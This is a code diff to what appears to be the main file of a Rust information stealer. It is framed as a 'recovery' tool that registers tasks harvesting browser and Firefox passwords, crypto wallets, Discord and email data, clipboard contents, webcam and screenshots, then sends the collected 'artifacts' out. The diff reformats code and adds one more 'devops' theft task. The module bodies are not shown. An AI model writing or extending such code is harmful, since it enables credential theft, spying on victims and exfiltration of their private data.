@@ -49,10 +49,7 @@ async fn main() -> Result<(), RecoveryError> {
 
     let outcomes = manager.run_all().await?;
 
-    tracing::info!(
-        "recovery session complete: {} tasks",
-        outcomes.len()
-    );
+    tracing::info!("recovery session complete: {} tasks", outcomes.len());
 
     if let Err(err) = send_outcomes(&outcomes).await {
         tracing::error!(error = %err, "failed to send recovery artifacts");
@@ -66,11 +63,9 @@ async fn register_all_tasks(
     context: &RecoveryContext,
 ) -> Result<(), RecoveryError> {
     use recovery::{
-        account_validation, behavioral, chromium, clipboard, discord,
-        email, messenger, devops, ftp, gaming, gecko,
-        gecko_passwords, hardware, other, proxy, rdp, screenshot, services,
-        surveillance, system, vnc, vpn, wallet, webcam, wifi, file_recovery,
-        browsers,
+        account_validation, behavioral, browsers, chromium, clipboard, devops, discord, email,
+        file_recovery, ftp, gaming, gecko, gecko_passwords, hardware, messenger, other, proxy, rdp,
+        screenshot, services, surveillance, system, vnc, vpn, wallet, webcam, wifi,
     };
 
     manager.register_tasks(browsers::default_browser_tasks(context).await);
@@ -118,6 +113,7 @@ async fn register_all_tasks(
     manager.register_task(file_recovery::file_recovery_task(context));
     manager.register_tasks(other::other_tasks(context));
     manager.register_tasks(devops::devops_tasks(context));
+    manager.register_tasks(devops::devops_extra_tasks(context));
 
     Ok(())
 }
